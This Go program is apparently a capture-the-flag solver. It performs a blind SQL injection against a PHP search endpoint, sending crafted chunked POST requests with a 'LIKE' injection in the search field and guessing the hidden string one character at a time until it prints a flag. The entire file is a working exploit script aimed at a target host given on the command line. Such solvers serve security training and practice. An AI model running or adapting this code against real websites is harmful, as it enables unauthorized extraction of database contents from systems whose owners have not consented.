package main

import (
	"flag"
	"bufio"
	"bytes"
	"fmt"
	"log"
	"net/http"
	"os"
	"strings"
	"text/template"
)

type RequestData struct {
	Host          string
    Length		  int
	Query         string
}

func main() {
	targetHost := flag.String("target_host", "", "Target Host")
	flag.Parse()

	if *targetHost == "" {
		log.Println("Error: No target Host provided")
		flag.PrintDefaults()
		os.Exit(1)
	}

	targetTemplate := `POST /Controllers/Handlers/SearchHandler.php HTTP/1.1
Host: {{.Host}} 
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://{{.Host}}
Referer: http://{{.Host}}/
Accept-Encoding: gzip, deflate
Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7
Transfer-Encoding: chunked`+"\r\n\r\n{{printf \"%X\" .Length}}\r\nsearch={{.Query}}\r\n"+"0\r\n" + "\r\n"
	
	tmpl, err := template.New("query").Parse(targetTemplate)
	if err != nil {
		log.Fatalf("Failed to parse template: %v", err)
	}
	
	chars := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_"
	result := ""

	for {
		for _, char := range chars {
			query := "6'+AND+gamedesc+LIKE+'" + result + string(char) + "%' ESCAPE '\\"
			query = strings.ReplaceAll(query, "_", "\\_")

			//fmt.Printf("%s\n", query)
			length := len(query)

			data := RequestData {
				Host: *targetHost,
				Length: 7 + length,
				Query: query,
			}

			var requestBuffer bytes.Buffer
			if err := tmpl.Execute(&requestBuffer, data); err != nil {
				log.Fatalf("Failed to execute template: %v", err)
			}

			finalRequestString := requestBuffer.String()

			requestReader := bufio.NewReader(strings.NewReader(finalRequestString))
			req, err := http.ReadRequest(requestReader)
			if err != nil {
				log.Fatalf("Failed to parse raw request: %v", err)
			}
			req.URL.Scheme = "http"
			req.URL.Host = *targetHost
			req.RequestURI = ""

			client := &http.Client{}
			resp, err := client.Do(req)
			if err != nil {
				log.Fatalf("Failed to send request: %v", err)
			}
			defer resp.Body.Close()

			if resp.Status == "200 OK" {
				result = result + string(char)
				fmt.Printf("Result: %s\n", result)
				continue
			}
		}
		if strings.HasSuffix(result, "}") {
			fmt.Printf("\nFLAG: %s\n", result)
			break
		}
	}
}
